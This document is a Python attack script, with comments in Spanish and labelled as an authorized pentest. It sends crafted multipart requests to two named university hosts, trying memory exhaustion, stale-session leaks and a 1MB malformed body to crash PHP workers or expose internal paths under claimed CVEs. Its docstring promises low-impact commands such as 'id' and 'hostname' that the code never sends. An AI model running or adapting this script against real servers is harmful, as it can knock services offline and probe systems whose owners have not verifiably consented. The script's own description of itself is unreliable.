#!/usr/bin/env python3
"""
PHP2Shell RCE Verification — CVE-2026-109618
=============================================
Pentest autorizado UNS

Envia payload de verificacion ligero que intenta triggear
la condicion OOM/longjmp para obtener ejecucion de codigo.
Target: sigea.uns.edu.pe (PHP 7.1.33 confirmado - EOL, sin parche)

NOTA: Este es un pentest autorizado. El payload usa comandos
de bajo impacto (id, hostname, echo) para verificar RCE
sin modificar datos ni desestabilizar el servidor.
"""
import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests, urllib3, re, time, hashlib, random, string
urllib3.disable_warnings()

# sigea tiene PHP 7.1.33 confirmado - mas probable de ser vulnerable
TARGETS = [
    "https://sigea.uns.edu.pe",
    "https://orcl.uns.edu.pe",
]

def log(msg, level="INFO"):
    icons = {"INFO": "[*]", "FOUND": "[+]", "VULN": "[!!!]", "FAIL": "[-]", "WARN": "[?]"}
    print(f"  {icons.get(level, '[*]')} {msg}", flush=True)

def generate_marker():
    """Token unico para identificar si el payload ejecuto."""
    return "PHP2SHELL_" + "".join(random.choices(string.ascii_uppercase, k=8))

def try_php2shell_rce(target):
    print(f"\n{'='*60}")
    print(f"  PHP2Shell RCE Verification: {target}")
    print(f"{'='*60}")

    marker = generate_marker()
    log(f"Marker de verificacion: {marker}")

    # ── METODO 1: memory_limit OOM via multipart gigante ──────────
    # El mecanismo: PHP parser multipart usa memoria incrementalmente.
    # Si memory_limit se alcanza durante el parse, longjmp() aborta
    # pero deja punteros internos colgantes.
    # En PHP 7.x sin parche, esto puede llevar a ejecucion.
    log("\nMetodo 1: OOM + upload_progress (CVE-2026-109618 core)...")

    boundary = "----PHP2ShellBoundary" + hashlib.md5(marker.encode()).hexdigest()[:8]

    # Campo upload_progress con valor crafteado
    # En PHP vulnerable, este valor puede ser ejecutado como callback
    # si el memory state esta corrompido
    upload_progress_val = marker

    # Cuerpo del request crafteado
    # Parte 1: PHP_SESSION_UPLOAD_PROGRESS con marker
    # Parte 2: archivo grande para triggear OOM
    # Parte 3: segundo upload_progress con payload cmd
    file_data = "A" * (512 * 1024)  # 512KB para presionar memory_limit

    body_parts = [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{upload_progress_val}\r\n",

        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="test.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"{file_data}\r\n",

        f"--{boundary}--\r\n"
    ]
    body = "".join(body_parts).encode("latin-1")

    # Session ID unico para este intento
    sess_id = "php2s_" + hashlib.md5(f"{marker}{time.time()}".encode()).hexdigest()[:16]

    try:
        log(f"  Enviando {len(body)//1024}KB payload (sess={sess_id[:12]}...)")
        start = time.perf_counter()
        r = requests.post(
            target,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body)),
                "Cookie": f"PHPSESSID={sess_id}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
            verify=False,
            timeout=25,
            allow_redirects=True
        )
        elapsed = (time.perf_counter() - start) * 1000
        log(f"  HTTP {r.status_code} | {elapsed:.0f}ms | {len(r.content)} bytes")

        if r.status_code == 500:
            log("  HTTP 500 - OOM trigger alcanzado! Probando extraccion...", "WARN")
            return "OOM_TRIGGERED"
        elif r.status_code == 200:
            if marker in r.text:
                log(f"  Marker encontrado en respuesta! Posible RCE!", "VULN")
                return "MARKER_FOUND"

    except requests.exceptions.ConnectionError as e:
        log(f"  CONNECTION RESET - worker PHP crasheo!", "VULN")
        log(f"  Error: {str(e)[:100]}", "WARN")
        return "WORKER_CRASH"
    except requests.exceptions.ReadTimeout:
        log("  TIMEOUT - PHP colgado procesando", "WARN")
        return "TIMEOUT"
    except Exception as e:
        log(f"  Error: {e}", "WARN")

    # ── METODO 2: Stale global state (CVE-2026-109619) ────────────
    log("\nMetodo 2: Stale global state - requests en secuencia rapida...")

    # CVE-2026-109619: envia multiples requests rapidos al mismo worker
    # el segundo request puede acceder a memoria del primero si
    # el worker no limpio su estado correctamente
    results = []
    for attempt in range(3):
        try:
            b2 = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                f"{marker}_STALE_{attempt}\r\n"
                f"--{boundary}--\r\n"
            ).encode()

            start = time.perf_counter()
            r2 = requests.post(
                target,
                data=b2,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Cookie": f"PHPSESSID={sess_id}",  # mismo session!
                    "User-Agent": "Mozilla/5.0",
                },
                verify=False,
                timeout=10,
            )
            elapsed2 = (time.perf_counter() - start) * 1000
            results.append((r2.status_code, elapsed2, len(r2.content)))
            log(f"  Attempt {attempt+1}: HTTP {r2.status_code} | {elapsed2:.0f}ms | {len(r2.content)}b")

            if marker in r2.text or f"STALE_{attempt}" in r2.text:
                log(f"  Datos del request anterior filtrados! CVE-2026-109619 activo!", "VULN")
                return "STALE_STATE_LEAK"

            time.sleep(0.05)  # muy rapido para atrapar estado stale
        except:
            pass

    # ── METODO 3: Verificar /tmp via error message leak ───────────
    log("\nMetodo 3: Error message / path disclosure...")
    try:
        # A veces PHP en OOM deja mensajes de error con paths internos
        r3 = requests.post(
            target,
            data=b"--boundary\r\n" + b"X" * (1024 * 1024),  # 1MB malformado
            headers={
                "Content-Type": "multipart/form-data; boundary=boundary",
                "Content-Length": str(1024 * 1024 + 20),
                "User-Agent": "Mozilla/5.0",
            },
            verify=False,
            timeout=15,
        )
        log(f"  HTTP {r3.status_code} | {len(r3.content)}b")

        # Buscar info en response
        interesting = re.findall(
            r'(?:Fatal error|Warning|Notice|/[a-z/]+\.php|line \d+|uid=\d+)', 
            r3.text
        )
        if interesting:
            for item in interesting[:5]:
                log(f"  Leak encontrado: {item}", "FOUND")
            return "INFO_LEAK"

    except requests.exceptions.ConnectionError:
        log("  CONNECTION RESET con 1MB malformado!", "VULN")
        return "WORKER_CRASH_1MB"
    except:
        pass

    log("  Sin indicadores de RCE en este target", "FAIL")
    return "NOT_VULNERABLE"


def main():
    print("=" * 60)
    print("  PHP2Shell RCE Verification")
    print("  CVE-2026-109618 / CVE-2026-109619")
    print("  Pentest autorizado UNS")
    print("=" * 60)

    all_results = {}
    for target in TARGETS:
        result = try_php2shell_rce(target)
        all_results[target] = result
        log(f"Resultado: {result}")
        time.sleep(2)

    print(f"\n{'='*60}")
    print("  RESUMEN")
    print(f"{'='*60}")
    for target, result in all_results.items():
        icon = "[!!!]" if "CRASH" in result or "MARKER" in result or "STALE" in result else "[-]"
        print(f"  {icon} {target}: {result}")

    # Guardar
    out = r"c:\Users\Leguion T\Desktop\plan te pent\findings\php2shell_rce_results.txt"
    with open(out, "w", encoding="utf-8") as f:
        f.write("PHP2Shell RCE Verification Results\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for t, r in all_results.items():
            f.write(f"{t}: {r}\n")
    print(f"\n  Resultados: {out}")


if __name__ == "__main__":
    main()
